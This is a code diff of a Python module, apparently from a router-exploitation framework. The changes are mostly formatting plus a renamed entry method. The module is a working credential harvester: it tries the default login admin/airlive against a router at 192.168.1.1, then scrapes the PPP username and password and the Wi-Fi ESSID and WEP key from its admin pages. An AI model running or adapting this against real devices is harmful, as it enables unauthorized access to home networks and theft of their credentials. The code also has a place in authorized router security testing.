@@ -20,24 +20,23 @@
 
 import httplib2
 import re
-from time import gmtime, strftime
-
 import core.Harvester
+
 
 class Harvester(core.Harvester.RextHarvester):
     #Default credentials and default IP of target ( ,() is there because of for cycle that goes through credentials)
-    def __init__(self):#need to fix passing credentials () breaks for cycle)
+    def __init__(self):  # need to fix passing credentials () breaks for cycle)
         self.target = "192.168.1.1"
-        self.credentials_list = (("admin","airlive"),())
+        self.credentials_list = (("admin", "airlive"), ())
         core.Harvester.RextHarvester.__init__(self)
 
     #Start method needs to be named do_* for nested interpreter
-    def do_harvest(self, e):
+    def do_run(self, e):
         http = httplib2.Http(".cache")
         for credentials in self.credentials_list:
             username = credentials[0]
             password = credentials[1]
-            http.add_credentials(username,password)
+            http.add_credentials(username, password)
             #Sending request
             try:
                 print("Connecting to " + self.target)
@@ -46,31 +45,31 @@ class Harvester(core.Harvester.RextHarvester):
                 print("Connection error:Probably server timeout")
                 return -1
             #Checks if authentication was successful
-            if(headers.status == 200):
+            if headers.status == 200:
                 print("200:Authentication successful :)")
                 ppp_credentials = self.fetch_ppp(body)
                 print(ppp_credentials)
                 #Sending request for home_wlan
                 headers, body = http.request("http://"+self.target+"/basic/home_wlan.htm")
-                if(headers.status == 200):
+                if headers.status == 200:
                     wlan_credentials = self.fetch_wlan(body)
                     print(wlan_credentials)
                     return 1
                 else:
                     print("Connection lost: Failed fetching home_wlan.html. Status code:"+headers.status)
                     return -1
-            elif(headers.status == 401):
+            elif headers.status == 401:
                 print("401:Authentication failed")
                 continue
-            elif(headers.status == 404):
+            elif headers.status == 404:
                 print("404:Page does not exists")
                 break
             else:
                 print("Something went wrong here. Status code:"+headers.status)
                 break
-        return 1 #this shouldn't happen
+        return 1  # this shouldn't happen
             
-    def fetch_ppp(self,body):
+    def fetch_ppp(self, body):
         html = body.decode('ascii')
         #Regex for username
         username_re = re.compile(r"""   #raw string
@@ -125,7 +124,7 @@ class Harvester(core.Harvester.RextHarvester):
             (?P=quote)                  #closed by quotes
             [^>]*?                      #any other args after NAME
             >                           #close of INPUT tag
-            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
+            """, re.ASCII | re.IGNORECASE | re.VERBOSE)
         essid = essid_re.search(html)
         essid = essid.group("essid")
         wep_key = wep_key_re.search(html)
@@ -134,5 +133,5 @@ class Harvester(core.Harvester.RextHarvester):
         return wlan_credentials
                 
 
-if __name__ == "__main__":
-    Harvester()
+#if __name__ == "__main__":
+Harvester()
